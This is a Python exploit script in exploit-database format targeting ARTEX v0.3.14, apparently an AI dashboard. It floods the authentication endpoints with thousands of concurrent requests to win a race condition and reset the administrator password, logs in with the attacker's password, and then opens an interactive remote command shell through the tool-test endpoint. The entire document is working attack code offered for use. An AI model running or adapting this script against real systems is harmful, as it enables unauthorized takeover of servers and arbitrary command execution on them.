# Exploit Title: ARTEX v0.3.14 Pre-Auth RCE via TOCTOU Race Condition
# Date: 2026-10-08
# Exploit Author: therustymate
# Vendor Homepage: https://github.com/Autumn-27/ARTEX
# Software Link: https://github.com/Autumn-27/ARTEX/releases/tag/v0.3.14
# Version: 0.3.14
# Tested on: Ubuntu Server 26.04.1 AMD64
# CVE : N/A

from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import as_completed
from threading import Thread
from threading import Event
from threading import Lock
from argparse import ArgumentParser
from collections import Counter
import requests
import time
import statistics

HEADERS = {
    "User-Agent": "ARTXploit/2.0 (@therustymate)"
}

ENDPOINT_API_HEALTH     = "/api/health"
ENDPOINT_AUTH_STATUS    = "/api/auth/status"
ENDPOINT_AUTH_INIT      = "/api/auth/init"
ENDPOINT_AUTH_LOGIN     = "/api/auth/login"
ENDPOINT_CMD_EXEC       = "/api/tools/custom/test"

EXPLOIT_SUCCESS_TRIGGER = False
POSSIBLE_EXPLOIT_SUCCESS_COUNTER = 0
THREAD_WORKER_REQUEST_FAIL_COUNTER = 0

COUNTER_LOCK = Lock()
MONITOR_STOP = Event()
thread_results = []

def race_worker(password: str, timeout: int):
    global POSSIBLE_EXPLOIT_SUCCESS_COUNTER
    global THREAD_WORKER_REQUEST_FAIL_COUNTER
    started = time.perf_counter()
    try:
        if MONITOR_STOP.is_set():
            return None
        requests.post(
            ENDPOINT_AUTH_INIT,
            json={
                "password": str(password)
            },
            headers=HEADERS,
            timeout=int(timeout)
        )
        if MONITOR_STOP.is_set():
            return None
        check_init = requests.get(
            ENDPOINT_AUTH_STATUS,
            headers=HEADERS,
            timeout=int(timeout)
        )
        check_init_json = check_init.json()

        initialized = check_init_json.get("initialized", None)

        elapsed = time.perf_counter() - started
        if initialized == False:
            POSSIBLE_EXPLOIT_SUCCESS_COUNTER += 1

        return {
            "ok": True,
            "elapsed": elapsed,
            "initialized": initialized,
            "error": None,
        }

    except Exception as e:
        with COUNTER_LOCK:
            THREAD_WORKER_REQUEST_FAIL_COUNTER += 1
        return {
            "ok": False,
            "elapsed": time.perf_counter() - started,
            "initialized": None,
            "error": str(e),
        }
    
def monitor_threads(request_amount: int):
    while not MONITOR_STOP.is_set():
        try:
            results = thread_results.copy()
            completed = len(results)

            if completed:
                latencies = [r["elapsed"] for r in results]

                latency_avg = statistics.mean(latencies) * 1000
                latency_max = max(latencies) * 1000

                failures = sum(not r["ok"] for r in results)
                init_true = sum(r["initialized"] is True for r in results)
                init_false = sum(r["initialized"] is False for r in results)
                init_unknown = sum(r["initialized"] is None for r in results)
            else:
                latency_avg = latency_max = 0
                failures = init_true = init_false = init_unknown = 0

            status = (
                f"[Progress: {completed:,}/{request_amount:,}] "
                f"[Active/Pending: {request_amount - completed:,}] "
                f"[Failed: {failures:,}] "
                f"[Latency: {latency_avg:.1f}/{latency_max:.1f} ms] "
                f"[Init T/F/?: {init_true}/{init_false}/{init_unknown}]"
            )

            print(f"\r\033[2K{status}", end="", flush=True)

            if init_false > 250:
                MONITOR_STOP.set()
                break

        except Exception as e:
            print(f"\n[Monitor Error] {e!r}", flush=True)

        MONITOR_STOP.wait(0.1)

def interative(token: str, target: str, timeout: int):
    while True:
        try:
            cmd = input(f"[{target}]> ")
            if cmd == "exit":
                break
            data = {
                "kind": "command",
                "exec": {
                    "command": cmd,
                    "timeout_ms": 10000
                },
                "param": {}
            }
            rce = requests.post(
                ENDPOINT_CMD_EXEC,
                headers=HEADERS,
                json=data,
                cookies={"artex_token": token},
                timeout=timeout
            )
            rce_json = rce.json()
            output = rce_json.get("output")
            if output != "":
                print(output)
            elif rce.status_code == 401:
                print("[!] Token expired.")
                return
            elif rce.status_code == 500:
                print("[!] Internal server error.")
            else:
                print(f"[-] Unknown error: {rce.status_code}")
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(e)

def main(args):
    global ENDPOINT_API_HEALTH
    global ENDPOINT_AUTH_STATUS
    global ENDPOINT_AUTH_INIT
    global ENDPOINT_AUTH_LOGIN
    global ENDPOINT_CMD_EXEC
    global EXPLOIT_SUCCESS_TRIGGER

    target = str(args.target)
    if target.endswith("/"):
        target = target[:-1]
    exploit_password = str(args.password)
    timeout = int(args.timeout)
    concurrency = int(args.concurrency)
    request_amount = int(args.requests)

    # Set Known API endpoints
    ENDPOINT_API_HEALTH     = f"{target}{ENDPOINT_API_HEALTH}"
    ENDPOINT_AUTH_STATUS    = f"{target}{ENDPOINT_AUTH_STATUS}"
    ENDPOINT_AUTH_INIT      = f"{target}{ENDPOINT_AUTH_INIT}"
    ENDPOINT_AUTH_LOGIN     = f"{target}{ENDPOINT_AUTH_LOGIN}"
    ENDPOINT_CMD_EXEC       = f"{target}{ENDPOINT_CMD_EXEC}"

    # Stage 1: Confirm it is an ARTEX service.
    print(f"[*] Checking the ARTEX service on: {target}")
    try:
        check_ARTEX = requests.get(
            ENDPOINT_API_HEALTH,
            headers=HEADERS,
            timeout=timeout
        )
        check_ARTEX_json = check_ARTEX.json()
    except Exception as e:
        print(f"[-] Health check failed: {e}")
        return
    if (
        check_ARTEX.status_code != 200
        or check_ARTEX_json.get("service", None) == None
        or check_ARTEX_json.get("service", None) != "artex"
    ):
        print("[-] This is not an ARTEX service.")
        return

    if check_ARTEX_json.get("ok") != True:
        print("[-] Not a healthy ARTEX service.")
        return
    artex_service   : str       = check_ARTEX_json.get("service", None)
    artex_version   : str       = check_ARTEX_json.get("version", None)

    print(f"[+] ARTEX service detected (HEALTH: OK): [{artex_service} {artex_version}]")

    # Stage 2: Check if the account default password is set.
    print("[*] Checking ARTEX initialization...")
    try:
        check_init = requests.get(
            ENDPOINT_AUTH_STATUS,
            headers=HEADERS,
            timeout=timeout
        )
        check_init_json = check_init.json()
    except Exception as e:
        print(f"[-] Init check failed: {e}")
        return
        
    initialized = check_init_json.get("initialized", None)
    if initialized != True:
        print("[!] ARTEX is NOT initialized! (VULNERABLE)")
        return

    print("[+] ARTEX is initialized.")

    # Stage 3: Attempt to DoS /api/auth/status (5 times)
    started = time.perf_counter()
    MONITOR_STOP.clear()
    print(f"[*] Launching {concurrency} workers (timeout={timeout}s)...")
    t = Thread(target=monitor_threads, daemon=True, args=(request_amount,))
    t.start()
    try:
        with ThreadPoolExecutor(max_workers=concurrency) as pool:
            futures = [
                pool.submit(race_worker, exploit_password, timeout)
                for _ in range(request_amount)
            ]

            for future in as_completed(futures):
                thread_results.append(future.result())

    except KeyboardInterrupt:
        EXPLOIT_SUCCESS_TRIGGER = True

    finally:
        MONITOR_STOP.set()
        t.join()

    wall = time.perf_counter() - started

    print()

    print(f"\n[+] Completed in {wall:.2f}s")

    init_false = 0
    for r in thread_results.copy():
        if r == None: continue
        init = r.get("initialized", "")
        if init == "": continue
        if init == True: continue
        init_false += 1

    if init_false == 0:
        print("[!] The exploit most likely failed.")

    print("[*] Waiting 10 seconds to stabilize the server...")
    time.sleep(10)

    # Stage 4: RCE via /api/tools/custom/test
    print("[*] Retrieving the authentication token...")
    try:
        auth = requests.post(
            ENDPOINT_AUTH_LOGIN,
            headers=HEADERS,
            json={
                "username": "ARTEX",
                "password": exploit_password
            },
            timeout=timeout
        )
        auth_json = auth.json()
    except Exception as e:
        print(f"[-] Authentication failed: {e}")
        return

    token = auth_json.get("token", "")
    if token == "":
        print(f"[-] Exploit failed. ({auth.status_code})")
        return

    print(f"[+] Token retrieved: {token}")

    print("[*] Executing reverse shell command...")
    data = {
        "kind": "command",
        "exec": {
            "command": f"echo artxploit",
            "timeout_ms": 10000
        },
        "param": {}
    }
    try:
        rce = requests.post(
            ENDPOINT_CMD_EXEC,
            headers=HEADERS,
            json=data,
            cookies={"artex_token": token},
            timeout=timeout
        )
        rce_json = rce.json()
    except Exception as e:
        print(f"[-] RCE failed: {e}")

    if rce_json.get("output") == "artxploit\n":
        print("[+] Exploit success.")
        interative(token, target, timeout)
    elif rce.status_code != 200:
        print(f"[-] RCE failed. [{rce.status_code}]")
        return

if __name__ == "__main__":
    parser = ArgumentParser(
        prog="ARTXploit",
        description="ARTEX AI Panel Exploit",
        epilog="Present by @therustymate"
    )
    parser.add_argument(
        "-t", "--target",
        help="ARTEX AI dashboard URL",
        type=str,
        required=True
    )
    parser.add_argument(
        "-p", "--password",
        help="New password to set (default: artxploit_pwned)",
        type=str,
        default="artxploit_pwned"
    )
    parser.add_argument(
        "--timeout",
        help="Set request timeout (default: 50)",
        type=int,
        default=50
    )
    parser.add_argument(
        "--concurrency",
        help="Set concurrency for thread requests (default: 10,000)",
        type=int,
        default=1000
    )
    parser.add_argument(
        "-r", "--requests",
        help="Set request for thread requests (default 10,000)",
        type=int,
        default=10000
    )

    args = parser.parse_args()
    main(args)